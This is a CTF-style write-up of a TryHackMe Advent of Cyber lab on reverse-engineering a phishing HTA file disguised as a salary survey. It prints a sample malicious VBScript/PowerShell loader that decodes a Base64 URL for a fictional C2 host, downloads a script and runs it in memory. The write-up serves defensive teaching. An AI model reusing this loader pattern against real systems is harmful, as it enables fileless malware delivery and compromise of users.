# Malware Analysis - Malhare.exe
Learn about malware analysis and forensics.

---

And in our kingdom of Wareville, just like in others, thousands of files of all kinds pass through the systems every day, from DOCX, PDF resumes received by our elves, to financial spreadsheets, CSVs from the accounting department, and executable files launched by different applications. But have you ever wondered which of these might be malicious? Which ones could actually belong to King Malhare? An interesting question, isn’t it?

Learning Objectives
In this task, the TBFC SOC team will investigate one specific file type, the HTA format - a type often used for legitimate purposes, yet just as frequently exploited by attackers. Your mission is to reverse-engineer the HTA and uncover how King Malhare tricked Wareville’s elves. 
To do this, you will have to look for:

- Application metadata
- Script functions
- Any network calls or encoded data
- Clues about exfiltration

---

**Important!: This room uses an HTA malware file. It's safe, but do not run it locally. For safety and the intended experience, If you download it manually, browsers may block it. If it does download, open it only in a text editor, and do not execute it.**

---

Below is a **clean, structured, copy-paste-ready THM GitHub write-up** in a standard **README.md** format. I’ve tightened wording, fixed flow, and organised it for clarity while keeping all technical depth.

---

# HTA File Analysis

**TryHackMe – Advent of Cyber 2025 (Day 21)**

## Overview

In mid-2025, security researchers observed ransomware groups abusing **HTA (HTML Application)** files disguised as fake verification pages to deliver **Epsilon Red ransomware**. This campaign impacted multiple organisations and highlighted the importance of understanding HTA files and their abuse potential.

While HTA files can be malicious, they were originally designed to simplify development and administration tasks in Windows environments. This write-up explores what HTA files are, how attackers weaponise them, and how to analyse a suspicious HTA used in a phishing campaign targeting TBFC employees.

---

## What Is an HTA File?

An **HTA (HTML Application)** is a Windows application built using:

* HTML
* CSS
* JavaScript or VBScript

Unlike standard web pages, HTAs run **outside the browser** via the Windows component:

```
mshta.exe
```

This allows HTAs to behave like lightweight desktop applications with direct access to system resources.

### Legitimate Use Cases

HTA files were commonly used to:

* Automate administrative or setup tasks
* Provide simple GUIs for scripts
* Prototype tools quickly
* Create lightweight IT support utilities

At TBFC, engineers and elves historically relied on HTAs to keep SOC-mas operations running smoothly.

---

## HTA File Structure

An HTA file closely resembles a standard HTML document and typically consists of three parts:

### 1. HTA Declaration

Defines the application and its behaviour:

* Window size
* Title
* Border style
* Taskbar visibility

### 2. Interface (HTML/CSS)

Defines what the user sees:

* Buttons
* Forms
* Text

### 3. Script Logic (VBScript / JavaScript)

Contains the logic executed when the HTA runs.

### Example: Legitimate HTA

```html
<html>
<head>
    <title>TBFC Utility Tool</title>
    <HTA:APPLICATION 
        ID="TBFCApp"
        APPLICATIONNAME="Utility Tool"
        BORDER="thin"
        CAPTION="yes"
        SHOWINTASKBAR="yes"
    />
</head>

<body>
    <h3>Welcome to the TBFC Utility Tool</h3>
    <input type="button" value="Say Hello" onclick="MsgBox('Hello from Wareville!')">
</body>
</html>
```

This HTA creates a small desktop window with a button that displays a message box.

---

## How Attackers Weaponise HTAs

HTAs are attractive to attackers because they combine:

* Script execution
* Native Windows access
* Trusted system binaries (Living-off-the-Land)

### Common Malicious Uses

* **Initial Access:** Delivered via phishing emails or fake web pages
* **Downloaders/Droppers:** Fetch second-stage payloads from a C2 server
* **Obfuscation:** Encoded payloads (Base64), hidden windows, minimal scripts
* **LOLbins Abuse:** Calls to `mshta.exe`, `powershell.exe`, `wscript.exe`, `rundll32.exe`

HTAs are often small launchers that execute or retrieve the real malware.

---

## Example: Malicious HTA (King Malhare)

```html
<script language="VBScript">
Option Explicit
Dim a:Set a=CreateObject("WScript.Shell")
Dim b
b="powershell -NoProfile -ExecutionPolicy Bypass -Command ""{$U=
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(
'aHR0cHM6Ly9yYXcua2luZy1tYWxoYXJlWy5dY29tL2MyL3NpbHZlci9yZWZzL2hlYWRzL21haW4vUkVEQUNURUQudHh0'))
$C=(Invoke-WebRequest -Uri $U -UseBasicParsing).Content
$B=[scriptblock]::Create($C)
$B}"""
a.Run b,0,True
self.close
</script>
```

---

## Malicious Indicators Breakdown

### Suspicious Application Metadata

Attackers often disguise HTAs with convincing titles like:

* *Salary Survey*
* *Internal Tool*
* *HR Form*

Always inspect:

```html
<title>
<HTA:APPLICATION>
```

---

### Embedded VBScript

The `<script language="VBScript">` block is where execution occurs.

Key red flags:

* `WScript.Shell`
* `CreateObject()`
* `Run`, `Execute`, `Eval`

---

### PowerShell Execution

```powershell
powershell -NoProfile -ExecutionPolicy Bypass
```

This is a common malware launcher pattern.

---

### Base64 Obfuscation

The Base64 string:

```
aHR0cHM6Ly9yYXcua2luZy1tYWxoYXJlWy5dY29tL2MyL3NpbHZlci9yZWZzL2hlYWRzL21haW4vUkVEQUNURUQudHh0
```

Decoded (using CyberChef) reveals a **remote URL**, typically pointing to a C2 or payload.

>  In this lab, the URL is intentionally redacted for safety.

---

### Execution Flow Variables

* **$U** → Decoded URL
* **$C** → Downloaded content
* **$B** → ScriptBlock created and executed in memory

 This pattern indicates **fileless execution**, a strong sign of malicious activity.

---

## HTA Analysis Methodology

When analysing a suspicious HTA:

1. Identify script sections (`VBScript`, `JavaScript`)
2. Search for:

   * Encoded strings (Base64)
   * External connections (HTTP/HTTPS)
   * System execution functions
3. Decode obfuscated data
4. Trace execution paths and variable usage

---

## Incident Scenario – Salary Survey Phishing

Several TBFC elves reported compromised laptops. Investigation revealed a common factor:

 **Phishing email with an HTA attachment**
 **Disguised as a salary survey**

---

## Static Analysis Setup

### Open the HTA Safely

To prevent execution:

```bash
pluma /root/Rooms/AoC2025/Day21/survey.hta
```

---

## HTA Analysis – survey.hta

### 1. Metadata Inspection

Located in the `<head>` section:

* Application name
* Intended purpose
* Window behaviour

This reveals how the HTA presents itself to users.

---

### 2. VBScript Functions Identified

The HTA defines **five functions**:

| Function             | Purpose                                  |
| -------------------- | ---------------------------------------- |
| `window_onLoad`      | Executes automatically on load           |
| `getQuestions()`     | Makes external requests and decodes data |
| `provideFeedback()`  | Gathers system info and executes payload |
| `decodeBase64()`     | Converts Base64 to binary                |
| `RSBinaryToString()` | Converts binary back to string           |

---

### 3. Suspicious Objects Used

```vbscript
CreateObject("InternetExplorer.Application")
CreateObject("WScript.Network")
CreateObject("WScript.Shell")
```

These allow:

* External communication
* System enumeration
* Command execution

---

### 4. User Interface Review

The `<body>` section (starting around line 169) shows a **legitimate-looking survey**, reinforcing social engineering.

---

## Conclusion

This HTA masquerades as a harmless salary survey while:

* Gathering system information
* Downloading external content
* Executing payloads in memory

HTAs remain dangerous because they:

* Execute outside browsers
* Leverage trusted Windows components
* Blend social engineering with technical abuse

Understanding HTA structure and execution flow is critical for detecting and stopping these attacks.

---

## Key Takeaways

* HTAs are powerful and dangerous when abused
* Base64 ≠ encryption, always decode
* Follow execution paths carefully
* Assume phishing when HTAs appear in email

---








